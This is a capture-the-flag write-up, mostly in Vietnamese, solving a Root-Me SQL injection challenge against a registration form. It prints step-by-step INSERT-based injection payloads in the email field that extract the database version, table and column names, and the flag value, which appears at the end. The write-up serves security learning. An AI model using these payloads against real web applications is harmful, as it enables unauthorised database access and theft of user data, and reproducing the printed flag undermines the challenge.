# SQL-Insert

Point: 40

Request Insert: fun & profit

Statement: Retrieve the flag

Related ressource: [SQL injection in insert, update and delete statements](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20SQL%20injection%20in%20insert,%20update%20and%20delete%20statements.pdf?_gl=1*jggomy*_ga*MTE0NDg5MTA5LjE2Nzk2MzIzMDY.*_ga_SRYSKX09J7*MTY4MjEyODY5NS41OC4xLjE2ODIxMjk4MzIuMC4wLjA.)

# Overview:

Form của challenge

![image](https://user-images.githubusercontent.com/115911041/233762097-617dc631-2eb0-46a2-8ee2-84c14a9ab232.png)

Challenge lần này cung cấp ta một form đăng kí và đăng nhập.Lấy được password admin là có được flag

Tên đề của bài này là INSERT, thì mình nghĩ sẽ có lien quan đến phần đăng kí

# Solution:

Đầu tien, tạo 1  account sau đó đi đăng nhập

 ```
 Username: admin
 Password: 123123
 Email: admin@gmail.com
 ```
![image](https://user-images.githubusercontent.com/115911041/233773209-e4fa2799-c554-4240-bb72-f66bb9bdb06c.png)

Kết quả hiển thị ra username và email. Ta có thể khai thác SQL ở phần này.Giờ mình sẽ thử giả lập lại phần đăng kí 

```
$username = $POST_['username'];
$password = $POST_['password'];
$email = $POST_['email'];

INSERT INTO example_table VALUES('$username','$password','$email');
```

Mình đã có thử một vài payload ở username thì nó bị filter nên mình sẽ chuyển sang email để khai thác.

Mình đã có đọc doc và nghiên cứu. Phát hiện ra mình có thể chèn payload kiểu như thế này

`INSERT INTO example_table (a,b,c) VALUES ('a','b','c'),('d','e','f')`

Mình sẽ thử mô phỏng cho các bạn dễ hiểu hơn 

```
$username = admin
$password = 123123
$email = c'),('d','e','f') -- -

INSERT INTO example_table (a,b,c) VALUES ('a','b','c'),('d','e','f') -- -
```

Vậy thì ta sẽ có công thức payload như sau
`email'),('username', 'password', 'payload') -- -`

Sau khi đã có phương pháp giải rồi, mình tạo 1 account mới với paload như trên

```
Username = admin17
Password = 123123
email = gg'),('ss','ss',select version()))-- -
```
![image](https://user-images.githubusercontent.com/115911041/235315371-e54023cb-36b5-41cf-ab8e-aeb0b9bc199d.png)

Sau đó login với `username= ss` và `password=ss`

![image](https://user-images.githubusercontent.com/115911041/235315355-2bbc7aa7-4128-49ea-bca8-25fe38a3099e.png)

Kết quả cho ra `Database version(): 10.3.34-MariaDB-0ubuntu0.20.04.1`. Ta tiếp tục fuzz để tìm ra được table và column, nhưng khi thử thì bị message “Request failed” cho đến khi sử dụng LIMIT thì mới biết là nó bị giới hạn

`email= gg'),('x','x',(select table_name from information_schema.tables limit 1))-- -`

![image](https://user-images.githubusercontent.com/115911041/235315633-b55ec0f0-d2ef-4d72-b0cd-747a755659e2.png)

Sau đó đăng nhập lại `username=x` và `password=x`

![image](https://user-images.githubusercontent.com/115911041/235315743-b740c121-ec33-498f-bd5b-593458944037.png)

Ta có kết quả là 1 table `ALL_PLUGINS`. Mình sử dụng `GROUP_CONCAT` để show các table. Và database đang chạy MariaDB, nên mình có tra [ở đây](https://mariadb.com/kb/en/information-schema-processlist-table/), ta sử dụng ` information_schema.processlist` để check các thread đang thực thi của server database.

`email= gg'),('y','y',(select group_concat(INFO) from information_schema.processlist limit 1))-- -`

Sau đó đăng nhập lại

![image](https://user-images.githubusercontent.com/115911041/235316022-ad64b291-9afa-4bc3-8c72-4d0c827d259b.png)

Tới chỗ này mình thấy khá kì kì, nên là mình sẽ thử payload mới

`email= gg'),('z','z',(select group_concat(table_name) from information_schema.tables where table_schema=database()))-- -`

![image](https://user-images.githubusercontent.com/115911041/235316471-6fa4fc61-196e-4d5a-bbbd-8e0c2ab485ac.png)

Thấy có 2 bảng là membres và flag. Cái ta quan tâm là flag nên ta sẽ khai thác bảng flag.

`email= gg'),('v','v',(select group_concat(column_name) from information_schema.columns where table_name='flag'))-- -`

![image](https://user-images.githubusercontent.com/115911041/235316581-82e47505-95c0-46a3-a357-e8cc0c62b7ea.png)

Lại cho ra 1 cột flag, ta tiếp tục khai thác

`email= gg'),('u','u',(select group_concat(flag) from flag))-- -`

![image](https://user-images.githubusercontent.com/115911041/235316681-005e5c0a-2f14-410e-95af-0259e13234f5.png)

`Flag:moaZ63rVXUhlQ8tVS7Hw`


